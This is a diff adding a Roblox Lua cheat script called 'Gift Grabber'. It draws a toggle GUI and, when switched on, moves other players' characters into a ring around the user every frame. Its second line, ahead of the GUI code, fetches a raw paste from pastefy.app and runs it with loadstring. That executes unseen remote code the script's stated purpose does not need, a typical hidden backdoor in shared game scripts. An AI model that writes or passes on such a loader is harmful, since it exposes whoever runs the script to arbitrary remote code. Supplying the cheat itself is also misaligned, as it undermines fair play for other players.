@@ -1,0 +1,112 @@
+-- Gift Grabber Toggle GUI + Loop Bring Visual (Blue-Grey Theme + Padding)
+loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GiftGrabberGUI"
+screenGui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.fromRGB(96, 125, 139) -- Blue-grey
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+-- Rounded corners for frame
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0.1, 0)
+frameCorner.Parent = frame
+
+-- Padding for frame content
+local framePadding = Instance.new("UIPadding")
+framePadding.PaddingTop = UDim.new(0, 10)
+framePadding.PaddingBottom = UDim.new(0, 10)
+framePadding.PaddingLeft = UDim.new(0, 10)
+framePadding.PaddingRight = UDim.new(0, 10)
+framePadding.Parent = frame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "🎁 Gift Grabber"
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(236, 239, 241) -- Light grey text
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.Parent = frame
+
+-- Toggle Button
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(1, 0, 0.4, 0) -- Full width (padding applied)
+toggleButton.Position = UDim2.new(0, 0, 0.5, 0)
+toggleButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80) -- Red OFF
+toggleButton.Text = "OFF"
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.Font = Enum.Font.GothamBold
+toggleButton.TextScaled = true
+toggleButton.Parent = frame
+
+-- Rounded corners for button
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0.1, 0)
+buttonCorner.Parent = toggleButton
+
+-- Padding inside button
+local buttonPadding = Instance.new("UIPadding")
+buttonPadding.PaddingTop = UDim.new(0, 10)
+buttonPadding.PaddingBottom = UDim.new(0, 10)
+buttonPadding.PaddingLeft = UDim.new(0, 10)
+buttonPadding.PaddingRight = UDim.new(0, 10)
+buttonPadding.Parent = toggleButton
+
+-- Toggle Variables
+local isOn = false
+local connection -- For loop bring
+
+-- Start loop bring
+local function startLoopBring()
+    local centerChar = player.Character
+    if not centerChar or not centerChar:FindFirstChild("HumanoidRootPart") then return end
+    
+    local t = 0
+    connection = RunService.RenderStepped:Connect(function(dt)
+        t += dt
+        local others = Players:GetPlayers()
+        for i, plr in ipairs(others) do
+            if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                local angle = (t * 2 + (i * (2 * math.pi / #others)))
+                local radius = 8
+                local targetPos = centerChar.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
+                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos, centerChar.HumanoidRootPart.Position)
+            end
+        end
+    end)
+end
+
+-- Stop loop bring
+local function stopLoopBring()
+    if connection then
+        connection:Disconnect()
+        connection = nil
+    end
+end
+
+-- Button Toggle
+toggleButton.MouseButton1Click:Connect(function()
+    isOn = not isOn
+    if isOn then
+        toggleButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120) -- Green ON
+        toggleButton.Text = "ON"
+        startLoopBring()
+    else
+        toggleButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80) -- Red OFF
+        toggleButton.Text = "OFF"
+        stopLoopBring()
+    end
+end)
